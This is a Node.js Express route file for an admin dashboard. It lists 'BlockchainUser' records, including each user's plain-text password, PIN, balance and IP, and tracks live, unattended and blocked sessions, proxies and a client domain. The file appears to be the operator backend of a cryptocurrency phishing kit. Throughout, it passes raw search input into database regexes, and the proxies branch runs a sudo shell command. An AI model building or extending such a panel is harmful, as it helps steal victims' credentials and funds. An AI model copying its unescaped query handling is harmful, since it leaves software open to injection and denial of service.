const express = require('express');
const router = express.Router();
const fs = require('fs')
const path = require('path')
const filePath = path.resolve('/root/proxies.json');
const domainsFilePath = path.resolve(__dirname, '../../domains.db');

const Notification = require('../../models/Notification');
const BlockchainUser = require('../../models/BlockchainUser');
const Visitor = require('../../models/Visitor');

router.get('/', async (req, res) => {
    const path = req.query.path || '';
    const page = req.query.page || 0;
    const search = req.query.search || '';
    const notification = await Notification.find({ noted: false });
    let now = new Date();
    now.setMinutes(now.getMinutes() - 2);
    const active = await BlockchainUser.find({
        $or: [
            { ip: { $regex: '', $options: 'i' } },
            { country: { $regex: '.*.*' } },
            { status: { $regex: '.*.*' } },
            { uid: { $regex: '.*.*' } }
        ],
        updatedAt: {
            $gte: now
        },
        blocked: false
    }).countDocuments();
    const unattended = await BlockchainUser.find({
        attendStatus: false,
        blocked: false
    }).countDocuments();

    let users = [];
    let userCount = 0;
    let total, blocked;
    let user = null;
    let proxies = [];
    let proxyCount = 0;

    const domains = fs.readFileSync(domainsFilePath, 'utf8');
    let clientDomain = domains.split('|||||||')[2];
    if (path.indexOf('/users/all') > -1) {
        userCount = await BlockchainUser.find({
            $or: [
                { ip: { $regex: search, $options: 'i' } },
                { country: { $regex: '.*' + search + '.*' } },
                { status: { $regex: '.*' + search + '.*' } },
                { uid: { $regex: '.*' + search + '.*' } },
                { user_no: { $regex: '.*' + search + '.*' } }
            ]
        }).countDocuments();
        const allUsers = await BlockchainUser.find({
            $or: [
                { ip: { $regex: search, $options: 'i' } },
                { country: { $regex: '.*' + search + '.*' } },
                { status: { $regex: '.*' + search + '.*' } },
                { uid: { $regex: '.*' + search + '.*' } },
                { user_no: { $regex: '.*' + search + '.*' } }
            ]
        }, ['uid', 'ip', 'country', 'user_no', 'status', 'password', 'balance', 'blocked', 'pin', 'attendStatus', 'createdAt'])
            // .sort({ pin: -1 })
            .skip(page * 10)
            .limit(10);
        users = allUsers;
    }
    else if (path.indexOf('/users/active') > -1) {
        let now = new Date();
        now.setMinutes(now.getMinutes() - 2);
        userCount = await BlockchainUser.find({
            $or: [
                { ip: { $regex: search, $options: 'i' } },
                { country: { $regex: '.*' + search + '.*' } },
                { status: { $regex: '.*' + search + '.*' } },
                { uid: { $regex: '.*' + search + '.*' } },
                { user_no: { $regex: '.*' + search + '.*' } }
            ],
            updatedAt: {
                $gte: now
            },
            blocked: false
        }).countDocuments();
        const activeUsers = await BlockchainUser.find({
            $or: [
                { ip: { $regex: search, $options: 'i' } },
                { country: { $regex: '.*' + search + '.*' } },
                { status: { $regex: '.*' + search + '.*' } },
                { uid: { $regex: '.*' + search + '.*' } },
                { user_no: { $regex: '.*' + search + '.*' } }
            ],
            updatedAt: {
                $gte: now
            },
            blocked: false
        }, ['uid', 'ip', 'country', 'user_no', 'status', 'password', 'balance', 'blocked', 'pin', 'attendStatus', 'createdAt'])
            // .sort({ pin: -1 })
            .skip(page * 10)
            .limit(10);
        users = activeUsers;
    }
    else if (path.indexOf('/users/blocked') > -1) {
        userCount = await BlockchainUser.find({
            $or: [
                { ip: { $regex: search, $options: 'i' } },
                { country: { $regex: '.*' + search + '.*' } },
                { status: { $regex: '.*' + search + '.*' } },
                { uid: { $regex: '.*' + search + '.*' } },
                { user_no: { $regex: '.*' + search + '.*' } }
            ],
            blocked: true
        }).countDocuments();
        const blockedUsers = await BlockchainUser.find({
            $or: [
                { ip: { $regex: search, $options: 'i' } },
                { country: { $regex: '.*' + search + '.*' } },
                { status: { $regex: '.*' + search + '.*' } },
                { uid: { $regex: '.*' + search + '.*' } },
                { user_no: { $regex: '.*' + search + '.*' } }
            ],
            blocked: true
        }, ['uid', 'ip', 'country', 'user_no', 'status', 'password', 'balance', 'blocked', 'pin', 'attendStatus', 'createdAt'], { skip: page * 10, limit: 10 });
        users = blockedUsers;
    }
    else if (path.indexOf('/users/pined') > -1) {
        userCount = await BlockchainUser.find({
            $or: [
                { ip: { $regex: search, $options: 'i' } },
                { country: { $regex: '.*' + search + '.*' } },
                { status: { $regex: '.*' + search + '.*' } },
                { uid: { $regex: '.*' + search + '.*' } },
                { user_no: { $regex: '.*' + search + '.*' } }
            ],
            pin: true,
            blocked: false
        }).countDocuments();
        const pinUsers = await BlockchainUser.find({
            $or: [
                { ip: { $regex: search, $options: 'i' } },
                { country: { $regex: '.*' + search + '.*' } },
                { status: { $regex: '.*' + search + '.*' } },
                { uid: { $regex: '.*' + search + '.*' } },
                { user_no: { $regex: '.*' + search + '.*' } }
            ],
            pin: true,
            blocked: false
        }, ['uid', 'ip', 'country', 'user_no', 'status', 'password', 'balance', 'blocked', 'pin', 'attendStatus', 'createdAt'], { skip: page * 10, limit: 10 });
        users = pinUsers;
    }
    else if (path.indexOf('/users/unattended') > -1) {
        userCount = await BlockchainUser.find({
            $or: [
                { ip: { $regex: search, $options: 'i' } },
                { country: { $regex: '.*' + search + '.*' } },
                { status: { $regex: '.*' + search + '.*' } },
                { uid: { $regex: '.*' + search + '.*' } },
                { user_no: { $regex: '.*' + search + '.*' } }
            ],
            attendStatus: false,
            blocked: false
        }).countDocuments();
        const unattendUsers = await BlockchainUser.find({
            $or: [
                { ip: { $regex: search, $options: 'i' } },
                { country: { $regex: '.*' + search + '.*' } },
                { status: { $regex: '.*' + search + '.*' } },
                { uid: { $regex: '.*' + search + '.*' } },
                { user_no: { $regex: '.*' + search + '.*' } }
            ],
            attendStatus: false,
            blocked: false
        }, ['uid', 'ip', 'country', 'user_no', 'status', 'password', 'balance', 'blocked', 'pin', 'attendStatus', 'createdAt'], { skip: page * 10, limit: 10 });
        users = unattendUsers;
    }
    else if (path.indexOf('/dashboard') > -1) {
        total = await Visitor.find().countDocuments();
        blocked = await BlockchainUser.find({ blocked: true }).countDocuments();
    }
    else if (path.indexOf('/users/view') > -1) {
        let uid = path.split('/');
        uid = uid[uid.length - 1];
        uid = uid.split('&');
        uid = uid[0];

        const _users = await BlockchainUser.find({ uid: uid });
        if (_users.length > 0) {
            let _user = _users.pop();
            const now = new Date();
            now.setMinutes(now.getMinutes() - 2);

            const updatedAt = new Date(_user.updatedAt);
            const isNotActiveFor2min = updatedAt.getTime() < now.getTime();
            user = JSON.parse(JSON.stringify(_user));

            user.isOffline = isNotActiveFor2min;
            if (isNotActiveFor2min) {
                user.status = '3';
            }
        }
    }
    else if (path.indexOf('/proxies') > -1) {
        let data = [];
        try {
            if (fs.existsSync(filePath)) {
                data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
            }
        } catch (err) {
            console.error(err)
        }

        let searchedData = data.filter((proxy) => (proxy.fullname.indexOf(search) > -1
            || proxy.ip.indexOf(search) > -1
            || proxy.port.indexOf(search) > -1));

        const { execSync } = require('child_process');
        let stdout = '';
        try {
            stdout = execSync('sudo lsof -i -P | grep LISTEN');
        } catch (e) {

        }

        let result = searchedData.slice(10 * page, 10 * (page + 1));
        result = result.map((p, index) => {
            if (stdout) {
                p.status = stdout.indexOf('localhost:' + p.origin) > -1 ||
                    stdout.indexOf('127.0.0.1:' + p.origin) > -1 ? 'running' : 'stopped';
            }
            else {
                p.status = 'stopped';
            }

            return p;
        })

        proxies = result;
        proxyCount = searchedData.length;
    }
    Notification.updateMany({}, { "$set": { noted: true } }).exec();
    return res.json({ notification, active, unattended, users, userCount, total, blocked, user, proxyCount, proxies, clientDomain });
})

router.get('/clear', async (req, res) => {
    Notification.deleteMany({}).exec();
    return res.json('success');
})

module.exports = router;
